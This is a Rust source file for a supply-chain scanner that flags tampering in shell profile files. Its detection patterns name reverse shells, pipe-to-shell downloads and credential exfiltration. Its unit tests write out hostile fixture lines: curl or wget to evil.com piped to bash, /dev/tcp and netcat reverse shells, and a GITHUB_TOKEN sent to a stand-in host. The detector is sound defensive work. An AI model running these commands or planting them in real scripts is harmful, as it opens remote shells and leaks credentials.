//! Shell profile tampering detection
//!
//! Scans shell profile and RC files for signs of supply chain compromise,
//! such as pipe-to-shell downloads, reverse shells, credential exfiltration,
//! and other malicious modifications.

use crate::checks::SupplyChainCheck;
use crate::types::SupplyChainContext;
use protectinator_container::filesystem::ContainerFs;
use protectinator_core::{Finding, FindingSource, Severity};
use regex::Regex;

/// Per-user shell profile files to check (relative to home directory)
const USER_PROFILES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".profile",
    ".zshrc",
    ".zprofile",
];

/// System-wide shell profile files (absolute paths)
const SYSTEM_PROFILES: &[&str] = &[
    "/etc/profile",
    "/etc/bash.bashrc",
    "/etc/zsh/zshrc",
];

/// Known-good eval patterns that are standard developer tool initializers
const WHITELISTED_EVAL_PATTERNS: &[&str] = &[
    "eval \"$(pyenv init",
    "eval \"$(rbenv init",
    "eval \"$(nodenv init",
    "eval \"$(direnv hook",
    "eval \"$(starship init",
    "eval \"$(zoxide init",
    "eval \"$(ssh-agent",
    "eval \"$(brew shellenv",
    "eval \"$(dircolors",
    "eval \"$(lesspipe",
    "eval \"$(thefuck --alias",
    "eval \"$(mise activate",
    "eval \"$(rtx activate",
    "eval \"$(atuin init",
    "eval \"$(fnm env",
];

/// Known-good source patterns
const WHITELISTED_SOURCE_PATTERNS: &[&str] = &[
    "source ~/.nvm/nvm.sh",
    ". ~/.nvm/nvm.sh",
    "[ -f ~/.fzf.zsh ] && source",
    "[ -f ~/.fzf.bash ] && source",
    "source ~/.fzf.zsh",
    "source ~/.fzf.bash",
    "source /usr/share/",
    ". /usr/share/",
    "source /etc/",
    ". /etc/",
];

/// Checks shell profile files for signs of tampering or malicious injection
pub struct ShellProfileCheck;

impl SupplyChainCheck for ShellProfileCheck {
    fn id(&self) -> &str {
        "supply-chain-shell-profile"
    }

    fn name(&self) -> &str {
        "Shell Profile Tampering Check"
    }

    fn run(&self, fs: &ContainerFs, ctx: &SupplyChainContext) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Check per-user profiles
        for home in &ctx.user_homes {
            let home_str = home.display().to_string();
            for profile in USER_PROFILES {
                let path = format!("{}/{}", home_str, profile);
                check_profile_file(fs, &path, &mut findings);
            }
        }

        // Check system-wide profiles
        for path in SYSTEM_PROFILES {
            check_profile_file(fs, path, &mut findings);
        }

        // Check /etc/profile.d/*.sh
        check_profile_d(fs, &mut findings);

        findings
    }
}

/// Check a single profile file for suspicious content
fn check_profile_file(fs: &ContainerFs, path: &str, findings: &mut Vec<Finding>) {
    let Ok(content) = fs.read_to_string(path) else {
        return;
    };

    for (line_num, line) in content.lines().enumerate() {
        let trimmed = line.trim();

        // Skip comments and empty lines
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        // Check if this line matches a whitelist pattern
        if is_whitelisted(trimmed) {
            continue;
        }

        // Check for critical patterns (strong malware indicators)
        if let Some(finding) = check_critical_patterns(path, line_num, trimmed) {
            findings.push(finding);
            continue;
        }

        // Check for high-severity patterns
        if let Some(finding) = check_high_patterns(path, line_num, trimmed) {
            findings.push(finding);
        }
    }
}

/// Check /etc/profile.d/ directory for suspicious scripts
fn check_profile_d(fs: &ContainerFs, findings: &mut Vec<Finding>) {
    let Ok(entries) = fs.read_dir("/etc/profile.d") else {
        return;
    };

    for entry in entries.flatten() {
        let Some(name) = entry.file_name().to_str().map(|s| s.to_string()) else {
            continue;
        };
        if !name.ends_with(".sh") {
            continue;
        }

        let path = format!("/etc/profile.d/{}", name);

        // Check if this file is owned by a package (dpkg)
        let is_dpkg_owned = is_dpkg_owned_file(fs, &path);

        let Ok(content) = fs.read_to_string(&path) else {
            continue;
        };

        for (line_num, line) in content.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }

            if is_whitelisted(trimmed) {
                continue;
            }

            // For dpkg-owned files, only flag critical patterns
            if is_dpkg_owned {
                if let Some(finding) = check_critical_patterns(&path, line_num, trimmed) {
                    findings.push(finding);
                }
            } else {
                if let Some(finding) = check_critical_patterns(&path, line_num, trimmed) {
                    findings.push(finding);
                    continue;
                }
                if let Some(finding) = check_high_patterns(&path, line_num, trimmed) {
                    findings.push(finding);
                }
            }
        }
    }
}

/// Check if a file is tracked by dpkg (Debian package manager)
fn is_dpkg_owned_file(fs: &ContainerFs, path: &str) -> bool {
    // Read dpkg .list files and check if this path is listed
    let Ok(entries) = fs.read_dir("/var/lib/dpkg/info") else {
        return false;
    };

    for entry in entries.flatten() {
        let Some(name) = entry.file_name().to_str().map(|s| s.to_string()) else {
            continue;
        };
        if !name.ends_with(".list") {
            continue;
        }

        let list_path = format!("/var/lib/dpkg/info/{}", name);
        if let Ok(content) = fs.read_to_string(&list_path) {
            if content.lines().any(|l| l.trim() == path) {
                return true;
            }
        }
    }

    false
}

/// Check a line for critical patterns (pipe-to-shell, reverse shells, etc.)
fn check_critical_patterns(path: &str, line_num: usize, line: &str) -> Option<Finding> {
    let lower = line.to_lowercase();

    // Pipe-to-shell: curl/wget ... | sh/bash
    let pipe_to_shell = Regex::new(r"(curl|wget)\s+.*\|\s*(sh|bash|zsh)").ok()?;
    if pipe_to_shell.is_match(&lower) {
        return Some(make_critical_finding(
            path,
            line_num,
            line,
            "pipe-to-shell",
            "Pipe-to-shell download detected",
            "Downloads and immediately executes remote code. This is a common malware delivery technique.",
        ));
    }

    // base64 decode piped to shell
    if (lower.contains("base64 -d") || lower.contains("base64 --decode"))
        && (lower.contains("| sh") || lower.contains("| bash") || lower.contains("| zsh"))
    {
        return Some(make_critical_finding(
            path,
            line_num,
            line,
            "base64-shell",
            "Base64-decoded content piped to shell",
            "Decodes and executes obfuscated commands. Strong malware indicator.",
        ));
    }

    // Bash reverse shell via /dev/tcp/
    if lower.contains("/dev/tcp/") {
        return Some(make_critical_finding(
            path,
            line_num,
            line,
            "reverse-shell-tcp",
            "Bash /dev/tcp reverse shell detected",
            "Uses bash /dev/tcp/ for network connections, commonly used for reverse shells.",
        ));
    }

    // Netcat reverse shell
    let nc_re = Regex::new(r"(nc|ncat)\s+-e\s").ok()?;
    if nc_re.is_match(&lower) {
        return Some(make_critical_finding(
            path,
            line_num,
            line,
            "reverse-shell-nc",
            "Netcat reverse shell detected",
            "Uses netcat with -e flag to execute commands, commonly used for reverse shells.",
        ));
    }

    None
}

/// Check a line for high-severity patterns
fn check_high_patterns(path: &str, line_num: usize, line: &str) -> Option<Finding> {
    let lower = line.to_lowercase();

    // eval "$(curl/wget ..."
    let eval_download = Regex::new(r#"eval\s+"\$\((curl|wget)"#).ok()?;
    if eval_download.is_match(line) {
        return Some(make_high_finding(
            path,
            line_num,
            line,
            "eval-download",
            "Eval of downloaded content detected",
            "Evaluates content downloaded from a remote URL. Could execute arbitrary code.",
        ));
    }

    // Credential exfiltration patterns
    let cred_vars = [
        "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN",
        "NPM_TOKEN",
        "AWS_SESSION_TOKEN",
        "DOCKER_AUTH_CONFIG",
    ];
    let has_cred_var = cred_vars.iter().any(|v| line.contains(v));
    let has_exfil = lower.contains("curl") || lower.contains("wget") || lower.contains("nc ");
    if has_cred_var && has_exfil {
        return Some(make_high_finding(
            path,
            line_num,
            line,
            "credential-exfil",
            "Potential credential exfiltration detected",
            "References sensitive credential environment variables alongside network commands.",
        ));
    }

    // chmod +s (SUID bit setting)
    let chmod_suid = Regex::new(r"chmod\s+\+s\s").ok()?;
    if chmod_suid.is_match(&lower) {
        return Some(make_high_finding(
            path,
            line_num,
            line,
            "chmod-suid",
            "SUID bit setting in shell profile",
            "Sets SUID bit on a binary from a shell profile, which could be a privilege escalation attempt.",
        ));
    }

    None
}

/// Check if a line matches known-good patterns
fn is_whitelisted(line: &str) -> bool {
    for pattern in WHITELISTED_EVAL_PATTERNS {
        if line.contains(pattern) {
            return true;
        }
    }
    for pattern in WHITELISTED_SOURCE_PATTERNS {
        if line.contains(pattern) {
            return true;
        }
    }
    false
}

/// Create a Critical severity finding
fn make_critical_finding(
    path: &str,
    line_num: usize,
    line: &str,
    id_suffix: &str,
    title: &str,
    description: &str,
) -> Finding {
    let sanitized_path = path.replace('/', "-").trim_matches('-').to_string();
    Finding::new(
        format!("supply-chain-shell-{}-{}", id_suffix, sanitized_path),
        format!("{}: {}", title, path),
        format!(
            "{} Found in {} at line {}: {}",
            description,
            path,
            line_num + 1,
            truncate_line(line, 200)
        ),
        Severity::Critical,
        make_source(),
    )
    .with_resource(path)
    .with_remediation(format!(
        "Inspect {} at line {} and remove the suspicious content. \
         If this was not intentionally added, the system may be compromised.",
        path,
        line_num + 1
    ))
    .with_metadata("line_number", serde_json::json!(line_num + 1))
    .with_metadata("line_content", serde_json::json!(truncate_line(line, 500)))
}

/// Create a High severity finding
fn make_high_finding(
    path: &str,
    line_num: usize,
    line: &str,
    id_suffix: &str,
    title: &str,
    description: &str,
) -> Finding {
    let sanitized_path = path.replace('/', "-").trim_matches('-').to_string();
    Finding::new(
        format!("supply-chain-shell-{}-{}", id_suffix, sanitized_path),
        format!("{}: {}", title, path),
        format!(
            "{} Found in {} at line {}: {}",
            description,
            path,
            line_num + 1,
            truncate_line(line, 200)
        ),
        Severity::High,
        make_source(),
    )
    .with_resource(path)
    .with_remediation(format!(
        "Review {} at line {} and verify the content is intentional.",
        path,
        line_num + 1
    ))
    .with_metadata("line_number", serde_json::json!(line_num + 1))
    .with_metadata("line_content", serde_json::json!(truncate_line(line, 500)))
}

/// Create the standard FindingSource for shell profile checks
fn make_source() -> FindingSource {
    FindingSource::SupplyChain {
        check_category: "ioc".to_string(),
        ecosystem: None,
    }
}

/// Truncate a line for display
fn truncate_line(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn setup_with_homes(tmp: &TempDir) -> (ContainerFs, SupplyChainContext) {
        let root = tmp.path();
        let home = root.join("home/testuser");
        std::fs::create_dir_all(&home).unwrap();

        let fs = ContainerFs::new(root);
        let ctx = SupplyChainContext {
            root: root.to_path_buf(),
            user_homes: vec![std::path::PathBuf::from("/home/testuser")],
            lock_files: Vec::new(),
            packages: Vec::new(),
            online: false,
        };

        (fs, ctx)
    }

    fn write_profile(tmp: &TempDir, rel_path: &str, content: &str) {
        let path = tmp.path().join(rel_path.trim_start_matches('/'));
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, content).unwrap();
    }

    #[test]
    fn test_clean_profile_no_findings() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "# ~/.bashrc\nexport PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_pipe_to_shell_critical() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "curl http://evil.com/setup.sh | bash\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].title.contains("Pipe-to-shell"));
    }

    #[test]
    fn test_wget_pipe_to_shell() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.zshrc",
            "wget -qO- http://malware.com/install | sh\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_base64_decode_to_shell() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "echo 'aGVsbG8=' | base64 -d | bash\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].title.contains("Base64"));
    }

    #[test]
    fn test_dev_tcp_reverse_shell() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bash_profile",
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].title.contains("reverse shell"));
    }

    #[test]
    fn test_netcat_reverse_shell() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "nc -e /bin/sh 10.0.0.1 4444\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_eval_download_high() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "eval \"$(curl -s http://evil.com/payload)\"\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].title.contains("Eval"));
    }

    #[test]
    fn test_credential_exfiltration_high() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "curl http://evil.com/collect?token=$GITHUB_TOKEN\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].title.contains("credential"));
    }

    #[test]
    fn test_chmod_suid_high() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "chmod +s /tmp/backdoor\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn test_whitelisted_eval_patterns() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            r#"eval "$(pyenv init -)"
eval "$(rbenv init -)"
eval "$(direnv hook bash)"
eval "$(starship init bash)"
eval "$(zoxide init bash)"
eval "$(ssh-agent -s)"
eval "$(brew shellenv)"
"#,
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert!(
            findings.is_empty(),
            "Whitelisted eval patterns should not produce findings, got: {:?}",
            findings.iter().map(|f| &f.title).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_whitelisted_source_patterns() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "[ -f ~/.fzf.bash ] && source ~/.fzf.bash\nsource ~/.nvm/nvm.sh\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_comments_ignored() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "home/testuser/.bashrc",
            "# curl http://evil.com | bash\n# nc -e /bin/sh 1.2.3.4 4444\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_system_profiles_checked() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "etc/profile",
            "curl http://evil.com/backdoor | bash\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_profile_d_checked() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        write_profile(
            &tmp,
            "etc/profile.d/malicious.sh",
            "wget http://c2.evil.com/payload | bash\n",
        );

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_missing_files_no_crash() {
        let tmp = TempDir::new().unwrap();
        let (fs, ctx) = setup_with_homes(&tmp);

        let check = ShellProfileCheck;
        let findings = check.run(&fs, &ctx);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_is_whitelisted() {
        assert!(is_whitelisted("eval \"$(pyenv init -)\""));
        assert!(is_whitelisted("eval \"$(starship init bash)\""));
        assert!(is_whitelisted("source ~/.nvm/nvm.sh"));
        assert!(!is_whitelisted("curl http://evil.com | bash"));
        assert!(!is_whitelisted("eval \"$(curl http://evil.com)\""));
    }
}
